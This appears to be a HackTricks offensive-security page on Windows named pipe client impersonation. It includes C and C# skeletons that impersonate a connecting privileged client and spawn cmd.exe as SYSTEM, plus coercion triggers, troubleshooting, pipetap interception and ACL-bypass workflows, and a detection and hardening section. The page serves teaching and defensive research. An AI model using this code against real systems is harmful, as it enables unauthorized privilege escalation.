# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation is a local privilege escalation primitive that lets a named-pipe server thread adopt the security context of a client that connects to it. In practice, an attacker who can run code with SeImpersonatePrivilege can coerce a privileged client (e.g., a SYSTEM service) to connect to an attacker-controlled pipe, call ImpersonateNamedPipeClient, duplicate the resulting token into a primary token, and spawn a process as the client (often NT AUTHORITY\SYSTEM).

This page focuses on the core technique. For end-to-end exploit chains that coerce SYSTEM to your pipe, see the Potato family pages referenced below.

## TL;DR
- Create a named pipe: `\\.\\pipe\\<random>` and wait for a connection.
- Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## Requirements and key APIs
- Privileges typically needed by the calling process/thread:
  - SeImpersonatePrivilege to successfully impersonate a connecting client and to use CreateProcessWithTokenW.
  - Alternatively, after impersonating SYSTEM, you can use CreateProcessAsUser, which may require SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege (these are satisfied when you’re impersonating SYSTEM).
- Core APIs used:
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile (must read at least one message before impersonation)
  - ImpersonateNamedPipeClient and RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: to perform useful actions locally, the client must allow SecurityImpersonation (default for many local RPC/named-pipe clients). Clients can lower this with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION when opening the pipe.

## Minimal Win32 workflow (C)

<details>
<summary>Minimal C skeleton</summary>

```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
    LPCSTR pipe = "\\\\.\\pipe\\evil";
    HANDLE hPipe = CreateNamedPipeA(
        pipe,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 0, 0, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) return 1;

    // Wait for privileged client to connect (see Triggers section)
    if (!ConnectNamedPipe(hPipe, NULL)) return 2;

    // Read at least one message before impersonation
    char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

    // Impersonate the last message sender
    if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

    // Extract and duplicate the impersonation token into a primary token
    HANDLE impTok = NULL, priTok = NULL;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
    if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

    // Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
    STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
    if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
                                 L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                                 0, NULL, NULL, &si, &pi)) {
        // Fallback: CreateProcessAsUser after you already impersonated SYSTEM
        CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
                             NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    }

    RevertToSelf(); // Restore original context
    return 0;
}
```

</details>
Notes:
- If ImpersonateNamedPipeClient returns ERROR_CANNOT_IMPERSONATE (1368), ensure you read from the pipe first and that the client didn’t restrict impersonation to Identification level.
- Prefer DuplicateTokenEx with SecurityImpersonation and TokenPrimary to create a primary token suitable for process creation.

## .NET quick example
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.

<details>
<summary>C# NamedPipeServerStream example</summary>

```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
  [DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
  [DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
  [DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
  static void Main(){
    using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
    s.WaitForConnection();
    // Ensure client sent something so the token is available
    s.RunAsClient(() => {
      IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
      IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
      var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
      Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
    });
  }
}
```

</details>

## Common triggers/coercions to get SYSTEM to your pipe
These techniques coerce privileged services to connect to your named pipe so you can impersonate them:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Troubleshooting and gotchas
- You must read at least one message from the pipe before calling ImpersonateNamedPipeClient; otherwise you’ll get ERROR_CANNOT_IMPERSONATE (1368).
- If the client connects with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, the server cannot fully impersonate; check the token’s impersonation level via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requires SeImpersonatePrivilege on the caller. If that fails with ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser after you already impersonated SYSTEM.
- Ensure your pipe’s security descriptor allows the target service to connect if you harden it; by default, pipes under \\.\pipe are accessible according to the server’s DACL.

## Detection and hardening
- Monitor named pipe creation and connections. Sysmon Event IDs 17 (Pipe Created) and 18 (Pipe Connected) are useful to baseline legitimate pipe names and catch unusual, random-looking pipes preceding token-manipulation events.
- Look for sequences: process creates a pipe, a SYSTEM service connects, then the creating process spawns a child as SYSTEM.
- Reduce exposure by removing SeImpersonatePrivilege from nonessential service accounts and avoiding unnecessary service logons with high privileges.
- Defensive development: when connecting to untrusted named pipes, specify SECURITY_SQOS_PRESENT with SECURITY_IDENTIFICATION to prevent servers from fully impersonating the client unless necessary.

## Instrumenting Named Pipe IPC with pipetap

[pipetap](https://github.com/sensepost/pipetap) is a named pipe multi-tool that lives inside the target process. The GUI injects a support DLL that hooks core Windows Named Pipe APIs (`CreateNamedPipeW`, `CreateFileW`, `ConnectNamedPipe`, `ReadFile`, `WriteFile`, etc.) so every operation is logged with metadata (opcode, PID, timestamps, byte counts, pipe name/handle) and the exact buffers the application saw. Because the hook runs in-process you can observe plaintext protocols before they are encrypted, serialized, or transformed.

### Hook/inject workflow
1. Run `pipetap-gui.exe` with the same or higher integrity as the target and, from the Injector view, load the support DLL into any process that talks over `\\.\pipe\*`.
2. The DLL stands up PID-scoped control/event pipes that the GUI (or other clients) use to send commands such as `OPEN_PIPE`, `READ_PIPE`, `WRITE_PIPE`, enable/disable intercept mode, and stream telemetry back out.
3. The Proxy tab groups captured traffic per pipe instance so you can pivot between multiple privileged services and baseline request/response formats without modifying binaries or restarting them.

### Live man-in-the-middle and replay
- Intercept mode pauses the target thread at every `ReadFile`/`WriteFile`, forwards the buffer to the GUI, and lets you edit bytes (flags, opcodes, length fields, authentication tokens, serialized structures) before the hook resumes the API call. This gives you an in-process MITM useful for poking at parsing bugs, logic flaws, or signature bypasses.
- Any captured payload can be resent verbatim or mutated against the same pipe instance or a new session, letting you fuzz or replay SYSTEM requests/responses without rebuilding tooling.

### Remote proxy to bypass pipe ACLs
1. Inject the DLL into a process that already has access to a restricted pipe (e.g., a SYSTEM service).
2. In the Remote Client view, instruct the DLL to open the target pipe from *inside* that process. All I/O now executes under the privileged token, and buffers are tunneled back to your controller.
3. Because the handle is created within the privileged context, named-pipe DACL restrictions are effectively bypassed and you keep full interactive control over both directions of traffic.

### Python automation channel
The `pipetap-python` package speaks the same TCP control protocol (default listener: 61337) so you can script fuzzers or replay harnesses that drive privileged pipes without touching the GUI:

```python
from pipetap import PipeTap

tap = PipeTap()
tap.connect("pipetap.test", "127.0.0.1")
tap.send(b"\x01\x00\x00\x00LOGIN")
print(tap.recv())
```

### Offensive use cases
- Reverse proprietary named-pipe protocols by capturing UTF-8/UTF-16 payloads directly at the API boundary.
- Validate authorization weaknesses (world-writable pipes, missing client validation) by modifying in-flight SYSTEM requests and replaying forged responses.
- Use the remote proxy to reach ACL-protected pipes or craft proof-of-concept inputs for elevation-of-privilege exploits without touching disk.

## References
- [Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior).](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation (walkthrough and code examples).](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – Named Pipe interception and proxy tooling.](https://github.com/sensepost/pipetap)

{{#include ../../banners/hacktricks-training.md}}
